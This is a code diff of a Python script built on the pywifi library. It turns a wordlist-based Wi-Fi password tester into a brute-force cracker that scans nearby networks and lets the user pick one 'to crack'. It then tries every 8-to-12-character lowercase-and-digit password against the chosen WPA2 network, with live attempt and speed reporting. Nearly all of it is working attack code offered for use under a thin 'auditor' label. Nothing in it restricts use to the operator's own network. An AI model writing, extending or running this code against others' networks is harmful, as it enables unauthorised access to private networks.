@@ -1,74 +1,110 @@
 import pywifi
 from pywifi import const
 import time
+import itertools
+import string
+import sys
 
-def scan_available_networks():
+def scan_networks():
+    """Scans for nearby Wi-Fi networks and returns a list of unique SSIDs."""
     wifi = pywifi.PyWiFi()
-    iface = wifi.interfaces()[0]  # Select the first Wi-Fi card
+    iface = wifi.interfaces()[0]
     
-    iface.scan()  # Trigger the scan
-    print("Scanning for networks...")
-    time.sleep(2) # Wait for results to populate
+    print("[*] Scanning for nearby networks... (5 seconds)")
+    iface.scan()
+    time.sleep(5)
     
-    scan_results = iface.scan_results()
-    networks = {network.ssid for network in scan_results if network.ssid}
-    return list(networks)
+    results = iface.scan_results()
+    # Remove duplicates and empty SSIDs
+    ssids = sorted(list({network.ssid for network in results if network.ssid}))
+    return ssids
 
-def wifi_test_loop(target_ssid, password_list):
+def password_generator(min_len=8, max_len=12):
+    """Generates all possible combinations of lowercase letters and numbers."""
+    # Note: Adding uppercase or symbols makes the time-to-crack increase exponentially
+    chars = string.ascii_lowercase + string.digits
+    for length in range(min_len, max_len + 1):
+        for combo in itertools.product(chars, repeat=length):
+            yield ''.join(combo)
+
+def attempt_crack(target_ssid):
+    """The main loop that generates and tests passwords against the target."""
     wifi = pywifi.PyWiFi()
-    iface = wifi.interfaces()[0] # Select your Wi-Fi card
+    iface = wifi.interfaces()[0]
+    
+    start_time = time.time()
+    attempts = 0
+    
+    print(f"\n[!] ATTACK STARTING ON: {target_ssid}")
+    print("[*] Press Ctrl+C to stop the operation.\n")
 
-    for password in password_list:
-        password = password.strip()
-        print(f"Testing: {password}")
+    for password in password_generator(8, 12):
+        attempts += 1
+        elapsed = time.time() - start_time
+        speed = attempts / elapsed if elapsed > 0 else 0
+        
+        # Live status update in the console
+        sys.stdout.write(f"\r[Attempt: {attempts}] Testing: {password} | Speed: {speed:.2f} p/s | Time: {int(elapsed)}s")
+        sys.stdout.flush()
 
-        # 1. Clean up old profiles and disconnect
+        # Disconnect and prep for new attempt
         iface.disconnect()
         while iface.status() == const.IFACE_CONNECTED:
             time.sleep(0.1)
+        
         iface.remove_all_network_profiles()
 
-        # 2. Create a new profile for this password attempt
+        # Build the connection profile
         profile = pywifi.Profile()
         profile.ssid = target_ssid
         profile.auth = const.AUTH_ALG_OPEN
-        profile.akm.append(const.AKM_TYPE_WPA2PSK) # for most routers
+        profile.akm.append(const.AKM_TYPE_WPA2PSK)
         profile.cipher = const.CIPHER_TYPE_CCMP
         profile.key = password
 
-        # 3. Apply profile and attempt connection
+        # Attempt to connect
         tmp_profile = iface.add_network_profile(profile)
         iface.connect(tmp_profile)
 
-        # 4. Verification Wait (Crucial step)
-        start_time = time.time()
-        while time.time() - start_time < 2.5: # 2-3 seconds is the standard wait time
+        # Wait for router handshake (crucial timing)
+        check_start = time.time()
+        while time.time() - check_start < 3.5:
             if iface.status() == const.IFACE_CONNECTED:
-                print(f"\n[!] SUCCESS! Password is: {password}")
-                return password
+                print(f"\n\n[SUCCESS] Password found: {password}")
+                print(f"Total Attempts: {attempts} | Total Time: {elapsed:.2f}s")
+                return True
             time.sleep(0.1)
+            
+    return False
 
-    print("\n[-] All passwords tested. No match found.")
-    return None
+def main():
+    print("=== PY-WIFI AUDITOR v1.0 ===")
+    
+    # 1. Scan and List
+    networks = scan_networks()
+    if not networks:
+        print("[-] No networks found. Ensure Wi-Fi is enabled.")
+        return
 
-def interactive_cracker():
-    # 1. Detect and display networks
-    networks = scan_available_networks()
+    print("\nAvailable Networks:")
     for i, ssid in enumerate(networks):
         print(f"[{i}] {ssid}")
-    
-    # 2. User selects the target
-    choice = int(input("Select the Network ID to test: "))
-    target_ssid = networks[choice]
-    
-    # 3. Start the test (using your brute-force logic)
-    print(f"Starting test on: {target_ssid}")
 
-    # 4. The password-testing loop 
-    wifi_test_loop()
+    # 2. User Selection
+    try:
+        choice = int(input("\nSelect the ID of the network to crack: "))
+        target_ssid = networks[choice]
+    except (ValueError, IndexError):
+        print("[-] Invalid selection.")
+        return
 
+    # 3. Execution
+    try:
+        found = attempt_crack(target_ssid)
+        if not found:
+            print("\n[-] Operation finished. No password was found.")
+    except KeyboardInterrupt:
+        print("\n\n[!] Operation stopped by user.")
 
-#Run and execute 
-print("PASS CRACKER")
-time.sleep(3)
-interactive_cracker()
+if __name__ == "__main__":
+    main()
